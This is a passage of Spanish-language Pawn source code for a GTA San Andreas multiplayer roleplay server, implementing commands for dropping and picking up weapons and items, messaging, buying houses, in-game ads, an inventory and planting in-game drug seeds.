		if(sscanf(params, "s[8]d", opcion, cantidad))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /tirar [Arma, Chaleco, Droga] [Cantidad]");
		if(!strcmp(opcion, "arma"))
		{
			if(cantidad <= 0 || cantidad > 1000)return Mensaje(playerid, COLOR_ROJO, "Grave Error: Solo es posible entre 1 - 1000");
			new MunicionArma 	= GetPlayerAmmo(playerid);

			if(MunicionArma < cantidad)return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene suficientes Municiones!");
			new MunicionTotal = MunicionArma-cantidad;

			if(weaponid != 0 && cantidad != 0)
			{
				new f = MAX_ARMAS+1;
				for(new a=0;a<sizeof(ArmaObjeto);a++)
				{
					if(ArmaObjeto[a][Objeto_xyz][0] == 0.0)
					{
						f=a;
						break;
					}
				}
				if(f>MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No puede tirar item's en este momento, intente mas tarde!");

				new Weapname[32];
				format(string, sizeof(string), "%s tira un arma al piso *", Nombre(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);

				GetWeaponName(weaponid, Weapname, sizeof(Weapname));
				format(string, sizeof(string), "((Notaras que es un(a) %s con %i municiones))", Weapname, cantidad);
				ProxDetector(30.0, playerid, string, COLOR_VERDE, COLOR_VERDE, COLOR_VERDE, COLOR_VERDE, COLOR_VERDE);

				RemovePlayerWeapon(playerid, weaponid);
				switch(weaponid){
					case 1, 2, 3, 4, 5, 6, 7, 8, 10, 15:{}
					default: darArma(playerid, weaponid, MunicionTotal);
				}

				ArmaObjeto[f][Objeto_Info][0] = weaponid;
				ArmaObjeto[f][Objeto_Info][1] = cantidad;
				GetPlayerPos(playerid, ArmaObjeto[f][Objeto_xyz][0], ArmaObjeto[f][Objeto_xyz][1], ArmaObjeto[f][Objeto_xyz][2]);

				format(string, sizeof(string), "{FFA500}%s {ffffff}con {FFA500}%i {ffffff}municiones\n{ffffff}Tirada en el suelo", Weapname, cantidad);
				ArmaObjeto[f][LabelObject][0] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, ArmaObjeto[f][Objeto_xyz][0], ArmaObjeto[f][Objeto_xyz][1], ArmaObjeto[f][Objeto_xyz][2]+0.25, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), -1, 10.0);//Arma
				ArmaObjeto[f][Objeto_id][0] = CreateDynamicObject(GunObjects[weaponid][0], ArmaObjeto[f][Objeto_xyz][0], ArmaObjeto[f][Objeto_xyz][1], ArmaObjeto[f][Objeto_xyz][2]-1, 93.7, 120.0, 120.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
				ArmaObjeto[f][oWorld][0] = GetPlayerVirtualWorld(playerid);
				ReduceTimeb[playerid] = gettime() + 10;
			}
		}
		else if(!strcmp(opcion, "chaleco")){
			cantidad = 0;
			new Float:chaleco;
			GetPlayerArmour(playerid, chaleco);
			if(chaleco >= 1){
				new f = MAX_ARMAS+1;
				for(new a=0;a<sizeof(ArmaObjeto);a++){
					if(ArmaObjeto[a][Objeto_xyz][3] == 0.0){
					f=a;
					break;
					}
				}
				if(f>MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No puede tirar item's en este momento, intente mas tarde!");

				format(string, sizeof(string), "%s tira un chaleco al piso *", Nombre(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);

				darArmadura(playerid, 0.0);
				ArmaObjeto[f][Objeto_Info][2] = floatround(chaleco);
				GetPlayerPos(playerid, ArmaObjeto[f][Objeto_xyz][3], ArmaObjeto[f][Objeto_xyz][4], ArmaObjeto[f][Objeto_xyz][5]);
				ArmaObjeto[f][LabelObject][1] = CreateDynamic3DTextLabel("{FFA500}Chaleco\n{ffffff}Tirado en el suelo", 0xFFFFFF44, ArmaObjeto[f][Objeto_xyz][3], ArmaObjeto[f][Objeto_xyz][4], ArmaObjeto[f][Objeto_xyz][5]+0.25, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), -1, 10.0);//Arma
				ArmaObjeto[f][Objeto_id][1] = CreateDynamicObject(1242, ArmaObjeto[f][Objeto_xyz][3], ArmaObjeto[f][Objeto_xyz][4], ArmaObjeto[f][Objeto_xyz][5]-1, 93.7, 120.0, 120.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
				ArmaObjeto[f][oWorld][1] = GetPlayerVirtualWorld(playerid);
				ReduceTimeb[playerid] = gettime() + 10;
			}
		}
		else if(!strcmp(opcion, "droga"))
		{
			if(cantidad <= 0 || cantidad > 200)return Mensaje(playerid, COLOR_ROJO, "Grave Error: Solo es posible entre 1 - 200");
			if(cuenta[playerid][cDrogas] >= 1)
			{
				new f = MAX_ARMAS+1;
				for(new a=0;a<sizeof(ArmaObjeto);a++)
				{
					if(ArmaObjeto[a][Objeto_xyz][6] == 0.0)
					{
						f=a;
						break;
					}
				}
				if(f>MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No puede tirar item's en este momento, intente mas tarde!");

				format(string, sizeof(string), "%s tira un paquete al piso *", Nombre(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);

				cuenta[playerid][cDrogas] -= cantidad;
				ArmaObjeto[f][Objeto_Info][3] = cantidad;

				GetPlayerPos(playerid, ArmaObjeto[f][Objeto_xyz][6], ArmaObjeto[f][Objeto_xyz][7], ArmaObjeto[f][Objeto_xyz][8]);
				ArmaObjeto[f][LabelObject][2] = CreateDynamic3DTextLabel("{FFA500}Paquete\n{ffffff}Tirado en el suelo", 0xFFFFFF44, ArmaObjeto[f][Objeto_xyz][6], ArmaObjeto[f][Objeto_xyz][7], ArmaObjeto[f][Objeto_xyz][8]+0.25, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid), -1, 10.0);//Arma
				ArmaObjeto[f][Objeto_id][2] = CreateDynamicObject(1279, ArmaObjeto[f][Objeto_xyz][6], ArmaObjeto[f][Objeto_xyz][7], ArmaObjeto[f][Objeto_xyz][8]-1, 93.7, 120.0, 120.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
				ArmaObjeto[f][oWorld][2] = GetPlayerVirtualWorld(playerid);
				ReduceTimeb[playerid] = gettime() + 10;
			}
		}
		else return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /tirar [Arma, Chaleco, Droga] [Cantidad]");
	}
	return 1;
}
COMMAND:recoger(playerid, params[]){
	if(IsPlayerConnected(playerid)){
		new opcion[8];
		if(sscanf(params, "s[8]", opcion))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /recoger [Arma, Chaleco, Droga]");
		if(!strcmp(opcion, "arma")){
			new f = MAX_ARMAS+1;
			for(new a=0;a<sizeof(ArmaObjeto);a++){
				if(GetPlayerVirtualWorld(playerid) == ArmaObjeto[a][oWorld][0] && IsPlayerInRangeOfPoint(playerid, 4.0, ArmaObjeto[a][Objeto_xyz][0], ArmaObjeto[a][Objeto_xyz][1], ArmaObjeto[a][Objeto_xyz][2])){
				f = a;
				break;
				}
			}
			if(f > MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No estás cerca de ningún arma!");
			else{
				new string[128];
				ArmaObjeto[f][Objeto_xyz][0] = 0.0;
				ArmaObjeto[f][Objeto_xyz][1] = 0.0;
				ArmaObjeto[f][Objeto_xyz][2] = 0.0;
				DestroyDynamicObject(ArmaObjeto[f][Objeto_id][0]);
				DestroyDynamic3DTextLabel(ArmaObjeto[f][LabelObject][0]);
				darArma(playerid, ArmaObjeto[f][Objeto_Info][0], ArmaObjeto[f][Objeto_Info][1]);
				format(string, sizeof(string), "%s recoje un arma del suelo *", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
		}
		else if(!strcmp(opcion, "chaleco")){
			new f = MAX_ARMAS+1;
			for(new a=0;a<sizeof(ArmaObjeto);a++){
				if(GetPlayerVirtualWorld(playerid) == ArmaObjeto[a][oWorld][1] && IsPlayerInRangeOfPoint(playerid, 4.0, ArmaObjeto[a][Objeto_xyz][3], ArmaObjeto[a][Objeto_xyz][4], ArmaObjeto[a][Objeto_xyz][5])){
					f = a;
					break;
				}
			}
			if(f > MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No estás cerca de ningún item!");
			else{
				new string[128];
				ArmaObjeto[f][Objeto_xyz][3] = 0.0;
				ArmaObjeto[f][Objeto_xyz][4] = 0.0;
				ArmaObjeto[f][Objeto_xyz][5] = 0.0;
				DestroyDynamicObject(ArmaObjeto[f][Objeto_id][1]);
				DestroyDynamic3DTextLabel(ArmaObjeto[f][LabelObject][1]);
				darArmadura(playerid, ArmaObjeto[f][Objeto_Info][2]);
				format(string, sizeof(string), "%s recoje un chaleco del suelo *", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
		}
		else if(!strcmp(opcion, "droga")){
			new f = MAX_ARMAS+1;
			for(new a=0;a<sizeof(ArmaObjeto);a++){
				if(GetPlayerVirtualWorld(playerid) == ArmaObjeto[a][oWorld][2] && IsPlayerInRangeOfPoint(playerid, 4.0, ArmaObjeto[a][Objeto_xyz][6], ArmaObjeto[a][Objeto_xyz][7], ArmaObjeto[a][Objeto_xyz][8])){
					f = a;
					break;
				}
			}
			if(f > MAX_ARMAS)return Mensaje(playerid, COLOR_GRIS2, "No estás cerca de ningún item!");
			else{
				new string[128];
				ArmaObjeto[f][Objeto_xyz][6] = 0.0;
				ArmaObjeto[f][Objeto_xyz][7] = 0.0;
				ArmaObjeto[f][Objeto_xyz][8] = 0.0;
				DestroyDynamicObject(ArmaObjeto[f][Objeto_id][2]);
				DestroyDynamic3DTextLabel(ArmaObjeto[f][LabelObject][2]);
				cuenta[playerid][cDrogas] += ArmaObjeto[f][Objeto_Info][3];
				format(string, sizeof(string), "%s recoje un paquete del suelo *", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
		}else{
			Mensaje(playerid, COLOR_GRIS2, "Utiliza: /recoger [Arma, Chaleco, Droga]");
		}
	}
	return 1;
}
COMMAND:mp(playerid, params[])
{
	if(estaSilenciado(playerid))return 1;
	new string[128], sms[128], jugador;
	if(sscanf(params, "us[128]", jugador, sms))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /mp (jugador) (texto)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
	if(booleano[HidePM]{jugador} && cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "Este administrador/ayudante tiene los susurros bloqueados!");
	if(booleano[gMensajesP]{jugador})return Mensaje(playerid, COLOR_GRIS2, "Este usuario esta en rol, tiene los MPs bloqueados!");
	
	if(gettime() > ProhibirPM[playerid]){

		format(string, sizeof(string), "Mensaje de %s (%d): %s", PlayerName(playerid), playerid, sms);
		Mensaje(jugador, 0xE9BC0AFF, string);
		format(string, sizeof(string), "Susurras a %s (%d): %s", PlayerName(jugador), jugador, sms);
		Mensaje(playerid, 0xE9BC0AFF, string);
		ProhibirPM[playerid] = gettime() + 180;
	}else{
		format(string, sizeof(string), "Debes esperar %s para volver a enviar otro MP.", ObtenerTiempoRestante(ProhibirPM[playerid]));
		Mensaje(playerid, COLOR_ROJO, string);
	}
	return 1;
}
COMMAND:casa(playerid, params[])
{
	new str[12], string[128], cas, idcas;
	if(sscanf(params, "ds[12]s[24]", cas, str, string))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /casa [slot 1 - 2] [ubicacion - nombre] [Texto]");
	idcas = (cas == 1) ? (cuenta[playerid][cCasa]):(cuenta[playerid][cCasa2]); 
	if(idcas == 9999)return Mensaje(playerid, COLOR_ROJO, "No posees una propiedad.");
	
	if(!strcmp("ubicacion", str))
	{
		format(casa[idcas][hUbicacion], 24, "%s", string);
		Mensaje(playerid, COLOR_VERDE, "Usted ha cambiado la direccion de su casa.");
		OnPropTextdrawUpdate(idcas);
	}
	else if(!strcmp("nombre", str))
	{
		format(casa[idcas][hNombre], 24, "%s", string);
		Mensaje(playerid, COLOR_VERDE, "Usted ha cambiado el nombre de su casa.");
		OnPropTextdrawUpdate(idcas);
	}
	return 1;
}
COMMAND:comprarcasa(playerid, params[])
{
	for(new h=0;h<sizeof(casa);h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, casa[h][hEntrancex], casa[h][hEntrancey], casa[h][hEntrancez]))
		{
			new string[128];
			if(casa[h][hOwned])return Mensaje(playerid, COLOR_ROJO, "Esta casa ya tiene dueño!");
			if(cuenta[playerid][cNivel] < casa[h][hLevel])
			{
				format(string, sizeof(string), "Esta propiedad requiere que seas nivel %d", casa[h][hLevel]);
				Mensaje(playerid, COLOR_ROJO, string);
				return 1;
			}
			if(obtenerDinero(playerid) >= casa[h][hValue])
			{
				if(cuenta[playerid][cCasa] == 9999) cuenta[playerid][cCasa] = h;
				else if(cuenta[playerid][cCasa2] == 9999 && cuenta[playerid][cDonador] >= 3) cuenta[playerid][cCasa2] = h;
				else return Mensaje(playerid, COLOR_ROJO, "No puedes tener mas propiedades.");
				
				//ZZCASH
				switch(cuenta[playerid][cDonador])
				{
					case 1: pierdeDinero(playerid, casa[h][hValue] - casa[h][hValue] * 1 / 100);
					case 2: pierdeDinero(playerid, casa[h][hValue] - casa[h][hValue] * 2 / 100);
					case 3: pierdeDinero(playerid, casa[h][hValue] - casa[h][hValue] * 3 / 100);
					case 4: pierdeDinero(playerid, casa[h][hValue] - casa[h][hValue] * 8 / 100);
					default: pierdeDinero(playerid, casa[h][hValue]);
				}
				
				casa[h][hOwned] = 1;
				casa[h][hTime] = gettime() + 2160000;
				cuenta[playerid][cEntrada] = h;
				format(casa[h][hOwner], 24, "%s", PlayerName(playerid));
				SetPosEx(playerid, casa[h][hExitx], casa[h][hExity], casa[h][hExitz], 0, casa[h][hInt], casa[h][hWorld]);
				Mensaje(playerid, COLOR_BLANCO, "Felicidades por comprar esta casa. Utiliza /ayuda casa");
				OnPropTextdrawUpdate(h);
				ActualizaCasa(h);
				return 1;
			}else Mensaje(playerid, COLOR_ROJO, "No tienes fondos suficientes para comprarte esta propiedad.");
		}
	}
	return 1;
}
COMMAND:ptoys(playerid, params[])
{
	Mensaje(playerid, COLOR_ROJO3, "* Te colocaste todos los toys de tu inventario.");
	for(new x;x<MAX_PLAYERTOYS;x++)
	{
		if(juguetes[playerid][x][ptModelID])
		{
			SetPlayerAttachedObject(playerid, x, juguetes[playerid][x][ptModelID], juguetes[playerid][x][ptBone], juguetes[playerid][x][ptPosX], juguetes[playerid][x][ptPosY], juguetes[playerid][x][ptPosZ], juguetes[playerid][x][ptRotX], juguetes[playerid][x][ptRotY], juguetes[playerid][x][ptRotZ], juguetes[playerid][x][ptScaleX], juguetes[playerid][x][ptScaleY], juguetes[playerid][x][ptScaleZ]);
		}
	}
	return 1;
}
COMMAND:ad(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1088.3285, -1379.8683, 13.8077))
	{
		new adsms[128], item[24];
		if(sscanf(params, "s[24]s[128]", item, adsms)) return Mensaje(playerid, COLOR_GRIS, "/ad [compra - venta - trabajo] [Anuncio]");
		if(palabrasProhibidas(adsms))return AccionSPAM(playerid, params[0]);
		if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_GRIS, "Debes ser mínimo nivel 3.");
		if(!cuenta[playerid][cTelefono])return Mensaje(playerid, COLOR_GRIS, "No tienes teléfono, cómpra uno en la tienda electronica.");

		new string[164];
		new Precio = 3 * strlen(adsms);

		if(adds > gettime())
		{
			format(string, sizeof(string), "* Tienes que esperar un minuto entre anuncio y anuncio. Prueba de aquí %d segundos.", adds - gettime());
			Mensaje(playerid, COLOR_GRIS2, string);
			return 1;
		}
		if(verificarDinero(playerid, Precio))
		{
			if(!strcmp(item, "compra"))
			{
				format(string, sizeof(string), "{13FF00}[Anuncio][COMPRA] {B1FF8C}%s (Contacto: {FFFFFF}%d{B1FF8C})", adsms, cuenta[playerid][cTelefono]);
			}else if(!strcmp(item, "venta"))
			{
				format(string, sizeof(string), "{13FF00}[Anuncio][VENTA] {B1FF8C}%s (Contacto: {FFFFFF}%d{B1FF8C})", adsms, cuenta[playerid][cTelefono]);
			}else if(!strcmp(item, "trabajo"))
			{
				format(string, sizeof(string), "{13FF00}[Anuncio][TRABAJO] {B1FF8C}%s (Contacto: {FFFFFF}%d{B1FF8C})", adsms, cuenta[playerid][cTelefono]);
			}else return Mensaje(playerid, COLOR_GRIS, "/ad [compra - venta - trabajo] [Anuncio]");

			OOCNews(-1, string);

			for(new i = 1; i < MAX_LINEAS-1; i++) Periodico[i] = Periodico[i+1];
			Periodico[MAX_LINEAS-1] = string;

			pierdeDinero(playerid, Precio);

			format(string, sizeof(string), "Anunciante: %s (%d)", PlayerName(playerid), playerid);
			MensajeAdmin(COLOR_BLANCO, string, 1);
			adds = gettime() + 60;
		}
	}
	else
	{
		Mensaje(playerid, COLOR_ROJO, "Para enviar un anuncio dirigirse a la Cabina de la CNN.");
	}
	return 1;
}
COMMAND:periodico(playerid, params[])
{
	new string[2048];
	if(!booleano[TienePeriodico]{playerid})return Mensaje(playerid, COLOR_ROJO, "Usted no posee un periodico.");
	for(new i=0;i<MAX_LINEAS;i++)
	{
		format(string, sizeof(string), "%s\n%s", string, Periodico[i]);
	}
	AccionMe(playerid, "toma el periodico y abre la seccion de anuncios.");
	ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Los Santos Periodico", string, "Aceptar", "");
	return 1;
}
COMMAND:inventario(playerid, params[])
{
	verificarArmaHack(playerid);
	if(Team_LSPD(playerid) || Team_FBI(playerid))return Mensaje(playerid, COLOR_GRIS2, "No puedes usar este comando debido a tu faccion!");

	new opcion[6], item[12], cantidad, string[144];
	if(sscanf(params, "s[6]S(nada)[12]D(-1)", opcion, item, cantidad))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /inventario [meter - sacar]");
	if(cantidad < -1 || cantidad > 500)return Mensaje(playerid, COLOR_GRIS2, "Escribe una cantidad valida.");
	if(strfind(opcion, "meter") != -1)
	{
		if(ReduceTimeb[playerid] > gettime())return Mensaje(playerid, COLOR_AMARILLO2, "Debes esperar 10 segundos para meter mas armas.");
		if(strfind(item, "arma") != -1)
		{
			if(cantidad == -1)return Mensaje(playerid, COLOR_GRIS2, "Utiliza /inventario [meter][arma - bebida][cantidad]");
			
			new armaid = GetPlayerWeapon(playerid);
			new ammo = GetPlayerAmmo(playerid);
			
			if(armaid)
			{
				if(cantidad < 1 || cantidad > 500)return Mensaje(playerid, COLOR_GRIS2, "Las municiones maximas son 500.");
				if(cantidad > ammo)return Mensaje(playerid, COLOR_GRIS2, "Tu no tienes esa cantidad de municiones.");
				//Normal
				for(new x=0;x<4;x++)
				{
					if(!inventario[playerid][invArmas][x])
					{
						if(inventario[playerid][invBalas][x] + cantidad > 500)return Mensaje(playerid, COLOR_GRIS2, "Usted no puede guardar mas municiones aqui, maximo 500.");
						
						inventario[playerid][invArmas][x] = armaid;
						inventario[playerid][invBalas][x] += cantidad;

						RemovePlayerWeapon(playerid, armaid);
						switch(armaid){
							case 1, 2, 3, 4, 5, 6, 7, 8, 10, 15:{}
							default: darArma(playerid, armaid, ammo - cantidad);
						}
				
						format(string, sizeof(string), "Usted metio una %s con %d de municion en su inventario.", NombreArma(armaid), cantidad);
						Mensaje(playerid, COLOR_VERDE, string);
						ReduceTimeb[playerid] = gettime() + 10;
						return 1;
					}
				}
				//VIP
				if(!inventario[playerid][invArmas][4] && cuenta[playerid][cDonador] == 4)
				{
					if(inventario[playerid][invBalas][4] + cantidad > 500)return Mensaje(playerid, COLOR_GRIS2, "Usted no puede guardar mas municiones aqui, maximo 500.");
					
					inventario[playerid][invArmas][4] = armaid;
					inventario[playerid][invBalas][4] += cantidad;
					
					darArma(playerid, armaid, -cantidad);
					
					format(string, sizeof(string), "Usted metio una %s con %d de municion en su inventario.", NombreArma(armaid), cantidad);
					Mensaje(playerid, COLOR_VERDE, string);
					ReduceTimeb[playerid] = gettime() + 10;
					return 1;
				}
				else if(!inventario[playerid][invArmas][5] && cuenta[playerid][cDonador] == 4)
				{
					if(inventario[playerid][invBalas][5] + cantidad > 500)return Mensaje(playerid, COLOR_GRIS2, "Usted no puede guardar mas municiones aqui, maximo 500.");
					
					inventario[playerid][invArmas][5] = armaid;
					inventario[playerid][invBalas][5] += cantidad;
					
					darArma(playerid, armaid, -cantidad);
					
					format(string, sizeof(string), "Usted metio una %s con %d de municion en su inventario.", NombreArma(armaid), cantidad);
					Mensaje(playerid, COLOR_VERDE, string);
					ReduceTimeb[playerid] = gettime() + 10;
					return 1;
				}
				Mensaje(playerid, COLOR_GRIS2, "Todos sus slots estan llenos.");
			}
		}
		else if(strfind(item, "bebida") != -1)
		{
			if(!entero[playerid][sbebidas])return Mensaje(playerid, COLOR_GRIS2, "Usted no tiene una bebida en la mano.");				
			if(inventario[playerid][invBebida][0])return Mensaje(playerid, COLOR_GRIS2, "Usted ya tiene una bebida guardada.");				
			
			inventario[playerid][invBebida][0] = entero[playerid][sbebidas];
			inventario[playerid][invBebida][1] = entero[playerid][borracho];
			
			RemovePlayerAttachedObject(playerid, 5);
			entero[playerid][borracho] = 0;
			entero[playerid][sbebidas] = 0;
			Mensaje(playerid, COLOR_BLANCO, "Usted metio una bebida en su inventario.");
		}
		else return Mensaje(playerid, COLOR_GRIS2, "Utiliza /inventario [meter][arma - bebida]");
	}
	else if(strfind(opcion, "sacar") != -1)
	{
		new tmp[64], tmp2[64 * 7];
		
		strcat(tmp2, "{c0c0c0}---ARMAS---\n");
		for(new x=0;x<6;x++)
		{
			format(tmp, sizeof(tmp), (inventario[playerid][invArmas][x]) ? ("{ff0000}[*] {FFD700}%s - %d\n"):("{008000}[*] {ffffff}Disponible\n"), NombreArma(inventario[playerid][invArmas][x]), inventario[playerid][invBalas][x]);
			strcat(tmp2, tmp);
		}		
		strcat(tmp2, "{c0c0c0}---BEBIDA---\n");
		strcat(tmp2, (inventario[playerid][invBebida][0]) ? ("{ff0000}[*] {FFD700}Lleno\n"):("{008000}[*] {ffffff}Disponible\n"));
		ShowPlayerDialog(playerid, DIALOGO_INVENTARIO, DIALOG_STYLE_LIST, "Inventario", tmp2, "Aceptar", "Cancelar");
	}
	return 1;
}
COMMAND:sembrarsemilla(playerid, params[])
{
	new ndroga[12], string[128], LimitarSemillas;
	if(sscanf(params, "s[12]", ndroga))return Mensaje(playerid, -1, "Utiliza: /sembrarsemilla [speed - ectasy - ritalin - heroina - marihuana]");

	for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
	{
		if(semillas[f][sSlot])
		{
			if(!strcmp(Nombre(playerid), semillas[f][sDueno]))
			{
				LimitarSemillas++;
				if(LimitarSemillas > 2)
				{
					Mensaje(playerid, COLOR_ROJO, "Imposible plantar mas de 3 semillas.");
					return 1;
				}
			}
		}
	}

	if(GetPlayerInterior(playerid) != 0)return Mensaje(playerid, COLOR_ROJO, "Imposible plantar en este lugar.");
	if(GetPlayerVirtualWorld(playerid) != 0)return Mensaje(playerid, COLOR_ROJO, "Imposible plantar en este lugar.");
	if(!strcmp("speed", ndroga))
	{
		if(cuenta[playerid][cSemillas][0] > 0)
		{
			cuenta[playerid][cSemillas][0]--;
			for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
			{
				if(!semillas[f][sSlot])
				{
					semillas[f][sSlot] = true;
					semillas[f][sTipo] = 1;
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1:		semillas[f][sTime] = gettime() + 3000;
						case 2:		semillas[f][sTime] = gettime() + 2400;
						case 3:		semillas[f][sTime] = gettime() + 1800;
						case 4:		semillas[f][sTime] = gettime() + 1200;
						default:	semillas[f][sTime] = gettime() + 3600;
					}
					
					semillas[f][sDueno] = Nombre(playerid);
					format(semillas[f][sNameTipo], 24, "Speed");

					GetPlayerPos(playerid, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]);
					format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
					semillas[f][sLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]+0.25, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 2.0);
					semillas[f][sObjeto] = CreateDynamicObject(3409, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]-1.2, 0, 0, 0);
					break;
				}
			}
		} else Mensaje(playerid, COLOR_GRIS1, "No posees este tipo de semilla.");
	}
	else if(!strcmp("ectasy", ndroga))
	{
		if(cuenta[playerid][cSemillas][1] > 0)
		{
			cuenta[playerid][cSemillas][1]--;
			for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
			{
				if(!semillas[f][sSlot])
				{
					semillas[f][sSlot] = true;
					semillas[f][sTipo] = 2;
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1:		semillas[f][sTime] = gettime() + 3000;
						case 2:		semillas[f][sTime] = gettime() + 2400;
						case 3:		semillas[f][sTime] = gettime() + 1800;
						case 4:		semillas[f][sTime] = gettime() + 1200;
						default:	semillas[f][sTime] = gettime() + 3600;
					}

					semillas[f][sDueno] = Nombre(playerid);
					format(semillas[f][sNameTipo], 24, "Ectasy");

					GetPlayerPos(playerid, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]);
					format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
					semillas[f][sLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]+0.25, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 2.0);
					semillas[f][sObjeto] = CreateDynamicObject(3409, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]-1.2, 0, 0, 0);
					break;
				}
			}
		}else Mensaje(playerid, COLOR_GRIS1, "No posees este tipo de semilla.");
	}
	else if(!strcmp("ritalin", ndroga))
	{
		if(cuenta[playerid][cSemillas][2] > 0)
		{
			cuenta[playerid][cSemillas][2]--;
			for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
			{
				if(!semillas[f][sSlot])
				{
					semillas[f][sSlot] = true;
					semillas[f][sTipo] = 3;
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1:		semillas[f][sTime] = gettime() + 3000;
						case 2:		semillas[f][sTime] = gettime() + 2400;
						case 3:		semillas[f][sTime] = gettime() + 1800;
						case 4:		semillas[f][sTime] = gettime() + 1200;
						default:	semillas[f][sTime] = gettime() + 3600;
					}

					semillas[f][sDueno] = Nombre(playerid);
					format(semillas[f][sNameTipo], 24, "Ritalin");

					GetPlayerPos(playerid, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]);
					format(string, sizeof(string), "{ffff00}Tipo{ffffff}: %s\n{ffff00}Tiempo de Cosecha{ffffff}: %s\n{ffff00}Dueño{ffffff}: %s", semillas[f][sNameTipo], ObtenerTiempoRestante(semillas[f][sTime]), semillas[f][sDueno]);
					semillas[f][sLabel] = CreateDynamic3DTextLabel(string, 0xFFFFFF44, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]+0.25, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 2.0);
					semillas[f][sObjeto] = CreateDynamicObject(3409, semillas[f][sPosicion][0], semillas[f][sPosicion][1], semillas[f][sPosicion][2]-1.2, 0, 0, 0);
					break;
				}
			}
		}else Mensaje(playerid, COLOR_GRIS1, "No posees este tipo de semilla.");
	}
	else if(!strcmp("heroina", ndroga))
	{
		if(cuenta[playerid][cSemillas][3] > 0)
		{
			cuenta[playerid][cSemillas][3]--;
			for(new f=0;f<MAX_SEMILLAS_SEMBRADAS;f++)
			{
				if(!semillas[f][sSlot])
				{
					semillas[f][sSlot] = true;
					semillas[f][sTipo] = 4;
					
					//ZZCASH
					switch(cuenta[playerid][cDonador])
					{
						case 1:		semillas[f][sTime] = gettime() + 3000;
						case 2:		semillas[f][sTime] = gettime() + 2400;
						case 3:		semillas[f][sTime] = gettime() + 1800;
						case 4:		semillas[f][sTime] = gettime() + 1200;
						default:	semillas[f][sTime] = gettime() + 3600;
					}

					semillas[f][sDueno] = Nombre(playerid);
					format(semillas[f][sNameTipo], 24, "Heroina");

